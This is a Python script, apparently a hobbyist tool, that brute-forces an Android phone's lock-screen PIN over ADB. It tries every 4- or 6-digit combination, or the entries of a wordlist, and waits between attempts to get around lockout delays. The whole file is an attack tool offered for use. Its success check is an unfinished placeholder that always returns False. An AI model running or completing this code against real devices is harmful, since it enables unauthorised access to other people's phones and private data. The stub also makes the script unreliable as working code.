import itertools
import time
import os
import shutil
import subprocess

def is_adb_authorized():
    try:
        result = subprocess.run("adb devices", shell=True, capture_output=True, text=True)
        if "unauthorized" in result.stdout or "device" not in result.stdout:
            return False
        return True
    except Exception as e:
        print(f"Error checking ADB authorization: {e}")
        return False

def try_pin(pin):
    print(f"Trying PIN: {pin}")
    # ADB command to input the PIN
    cmd = f"adb shell input text {pin}"
    subprocess.run(cmd, shell=True)
    time.sleep(1)
    # Press enter to submit the PIN (this might vary based on device)
    subprocess.run("adb shell input keyevent 66", shell=True)
    # Placeholder for success check, modify this based on how you want to check success
    # Example: Check device unlocked status
    # This part needs to be customized based on actual success criteria
    return False  # Replace with actual success checking logic

def brute_force_pin(pin_length=4):
    possible_digits = '0123456789'
    attempt_count = 0

    for pin in itertools.product(possible_digits, repeat=pin_length):
        pin_str = ''.join(pin)

        if try_pin(pin_str):
            print(f"PIN found: {pin_str}")
            break

        attempt_count += 1

        if attempt_count == 5 or attempt_count == 10:
            print("30 seconds delay due to incorrect attempts")
            time.sleep(30)
        elif attempt_count > 10:
            print("30 seconds delay after each attempt")
            time.sleep(30)
    else:
        print("PIN not found")

def brute_force_pin_with_wordlist(wordlist_path):
    attempt_count = 0

    try:
        with open(wordlist_path, 'r') as file:
            for line in file:
                pin_str = line.strip()

                if try_pin(pin_str):
                    print(f"PIN found: {pin_str}")
                    break

                attempt_count += 1

                if attempt_count == 5 or attempt_count == 10:
                    print("30 seconds delay due to incorrect attempts")
                    time.sleep(30)
                elif attempt_count > 10:
                    print("30 seconds delay after each attempt")
                    time.sleep(30)
            else:
                print("PIN not found")
    except FileNotFoundError:
        print("Wordlist file not found. Please check the path and try again.")

def print_centered(text, width):
    print(text.center(width))

def menu():
    if not is_adb_authorized():
        print("ADB is not authorized or device is not connected. Please check and try again.")
        return

    while True:
        os.system('clear')
        terminal_size = shutil.get_terminal_size((80, 20))
        width = terminal_size.columns
        height = terminal_size.lines

        # Print title
        print_centered("Android PIN Brute Force", width)
        print()

        # Centering the menu options
        options = ["1. Brute Force 4-Digit PIN", "2. Brute Force 6-Digit PIN", "3. Use Wordlist", "4. Exit"]
        
        for option in options:
            print_centered(option, width)

        print()

        choice = input("Enter your choice: ").strip()
        print()

        if choice == '1':
            brute_force_pin(4)
        elif choice == '2':
            brute_force_pin(6)
        elif choice == '3':
            wordlist_path = input("Enter the path to your wordlist: ").strip()
            brute_force_pin_with_wordlist(wordlist_path)
        elif choice == '4':
            break
        else:
            print_centered("Invalid choice. Please try again.", width)
            time.sleep(2)

        # Print the created by statement at the bottom right corner
        os.system('clear')
        terminal_size = shutil.get_terminal_size((80, 20))
        width = terminal_size.columns
        height = terminal_size.lines
        print("\n" * (height - 2) + " " * (width - 25) + "Created by LOG1C0x06")

if __name__ == "__main__":
    menu()
